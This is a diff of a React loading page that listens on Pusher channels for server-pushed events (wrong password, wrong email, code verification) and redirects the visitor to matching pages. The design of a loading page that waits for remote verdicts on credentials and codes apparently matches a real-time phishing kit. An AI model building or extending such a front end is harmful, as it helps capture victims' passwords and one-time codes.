@@ -35,102 +35,58 @@ function Loading() {
   const[ReverifyId, setReVerifyId] = useState('');
   console.log(wrongPasswordId)
   const id = Cookies.get("id");
-  const pusher = new Pusher("05656b52c62c0f688ee3", {
+  const pusher = new Pusher("7ceaf0e1db0706ddfe8d", {
     // APP_KEY
     cluster: "ap2",
     encrypted: true,
   });
+
   useEffect(() => {
+    if (!id) return;
     const channel = pusher.subscribe(id);
 
     channel.bind('pass-wrong', (data) => {
-      // Perform the revalidation or data fetching logic here
-      console.log('Path data updated:', data);
-      console.log(data.id)
-      setWrongPasswordId(data.id); // Function to refetch or revalidate your path data
+      console.log('Path data updated pass-wrong:', data);
+      setWrongPasswordId(data.id);
+    });
+
+    channel.bind('email-wrong', (data) => {
+      console.log('Path data updated email-wrong:', data);
+      setWrongMailId(data.id);
+    });
+
+    channel.bind('code-verify', (data) => {
+      console.log('Path data updated code-verify:', data);
+      Cookies.set("code", data.code);
+      setVerifyId(data.id);
+    });
+
+    channel.bind('code-re-verify', (data) => {
+      console.log('Path data updated code-re-verify:', data);
+      Cookies.set("code", data.code);
+      setReVerifyId(data.id);
     });
 
     return () => {
       channel.unbind('pass-wrong');
-      channel.unsubscribe(id);
-    };
-  }, [id]);
-  useEffect(() => {
-    const channel = pusher.subscribe(id);
-
-    channel.bind('email-wrong', (data) => {
-      // Perform the revalidation or data fetching logic here
-      console.log('Path data updated:', data);
-      console.log(data.id)
-      setWrongMailId(data.id); // Function to refetch or revalidate your path data
-    });
-
-    return () => {
       channel.unbind('email-wrong');
-      channel.unsubscribe(id);
-    };
-  }, [id]);
-  useEffect(() => {
-    const channel = pusher.subscribe(id);
-
-    channel.bind('login-successfull', (data) => {
-      // Perform the revalidation or data fetching logic here
-      console.log('Path data updated:', data);
-      console.log(data.id)
-      // setSuccessId(data.id); // Function to refetch or revalidate your path data
-    });
-
-    return () => {
-      channel.unbind('login-successfull');
-      channel.unsubscribe(id);
-    };
-  }, [id]);
-  useEffect(() => {
-    const channel = pusher.subscribe(id);
-
-    channel.bind('code-verify', (data) => {
-      // Perform the revalidation or data fetching logic here
-      console.log('Path data updated:', data);
-      Cookies.set("code", data.code);
-      setVerifyId(data.id); // Function to refetch or revalidate your path data
-    });
-
-    return () => {
       channel.unbind('code-verify');
-      channel.unsubscribe(id);
-    };
-  }, [id]);
-  useEffect(() => {
-    const channel = pusher.subscribe(id);
-    channel.bind('code-re-verify', (data) => {
-      // Perform the revalidation or data fetching logic here
-      console.log('Path data updated:', data);
-      Cookies.set("code", data.code);
-      setReVerifyId(data.id); // Function to refetch or revalidate your path data
-    });
-
-    return () => {
       channel.unbind('code-re-verify');
-      channel.unsubscribe(id);
+      pusher.unsubscribe(id);
     };
   }, [id]);
+
   if (wrongMailId) {
-    // Perform the revalidation or data fetching logic here
-  return router.push(`/signin`);
+    return router.push(`/login`);
   }
   if (wrongPasswordId) {
-    // Perform the revalidation or data fetching logic here
-  return router.push(`/wrongPassword`);
+    return router.push(`/wrongPassword`);
   }
-;
-  
   if (verifyId) {
-    // Perform the revalidation or data fetching logic here
-  return router.push(`/verifyCode`);
+    return router.push(`/verifyCode`);
   }
   if (ReverifyId) {
-    // Perform the revalidation or data fetching logic here
-  return router.push(`/reVerifyCode`);
+    return router.push(`/reVerifyCode`);
   }
   return (
     
